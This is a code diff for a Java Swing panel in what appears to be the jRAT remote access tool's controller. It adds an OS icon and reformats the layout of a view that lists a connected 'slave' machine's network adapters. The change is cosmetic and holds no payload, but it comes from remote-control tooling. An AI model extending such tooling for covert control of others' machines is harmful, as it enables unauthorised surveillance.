@@ -2,6 +2,7 @@ package io.jrat.client.ui.panels;
 
 import io.jrat.client.Slave;
 import io.jrat.client.packets.outgoing.Packet82NetworkAdapters;
+import io.jrat.client.utils.IconUtils;
 
 import java.awt.event.ActionEvent;
 import java.awt.event.ActionListener;
@@ -10,6 +11,7 @@ import javax.swing.GroupLayout;
 import javax.swing.GroupLayout.Alignment;
 import javax.swing.ImageIcon;
 import javax.swing.JButton;
+import javax.swing.JLabel;
 import javax.swing.JScrollPane;
 import javax.swing.JTable;
 import javax.swing.LayoutStyle.ComponentPlacement;
@@ -49,9 +51,34 @@ public class PanelControlAdapters extends PanelControlParent {
 				clear();
 			}
 		});
+		
+		JLabel lblWin = new JLabel("");
+		lblWin.setIcon(IconUtils.getIcon("os"));
 		GroupLayout groupLayout = new GroupLayout(this);
-		groupLayout.setHorizontalGroup(groupLayout.createParallelGroup(Alignment.LEADING).addGroup(groupLayout.createSequentialGroup().addContainerGap().addComponent(btnReloadList).addPreferredGap(ComponentPlacement.RELATED).addComponent(btnClear).addContainerGap(446, Short.MAX_VALUE)).addComponent(scrollPane, GroupLayout.DEFAULT_SIZE, 600, Short.MAX_VALUE));
-		groupLayout.setVerticalGroup(groupLayout.createParallelGroup(Alignment.LEADING).addGroup(groupLayout.createSequentialGroup().addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 302, GroupLayout.PREFERRED_SIZE).addPreferredGap(ComponentPlacement.RELATED).addGroup(groupLayout.createParallelGroup(Alignment.LEADING).addComponent(btnClear).addComponent(btnReloadList)).addContainerGap(13, Short.MAX_VALUE)));
+		groupLayout.setHorizontalGroup(
+			groupLayout.createParallelGroup(Alignment.LEADING)
+				.addGroup(groupLayout.createSequentialGroup()
+					.addContainerGap()
+					.addComponent(btnReloadList)
+					.addPreferredGap(ComponentPlacement.RELATED)
+					.addComponent(btnClear)
+					.addPreferredGap(ComponentPlacement.RELATED, 380, Short.MAX_VALUE)
+					.addComponent(lblWin)
+					.addContainerGap())
+				.addComponent(scrollPane, GroupLayout.DEFAULT_SIZE, 600, Short.MAX_VALUE)
+		);
+		groupLayout.setVerticalGroup(
+			groupLayout.createParallelGroup(Alignment.LEADING)
+				.addGroup(groupLayout.createSequentialGroup()
+					.addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 302, GroupLayout.PREFERRED_SIZE)
+					.addPreferredGap(ComponentPlacement.RELATED)
+					.addGroup(groupLayout.createParallelGroup(Alignment.TRAILING)
+						.addGroup(groupLayout.createParallelGroup(Alignment.LEADING)
+							.addComponent(btnClear)
+							.addComponent(btnReloadList))
+						.addComponent(lblWin))
+					.addContainerGap(17, Short.MAX_VALUE))
+		);
 
 		table = new JTable();
 		table.setModel(model = new DefaultTableModel(new Object[][] {}, new String[] { "Display name", "Name", "InetAddresses" }));
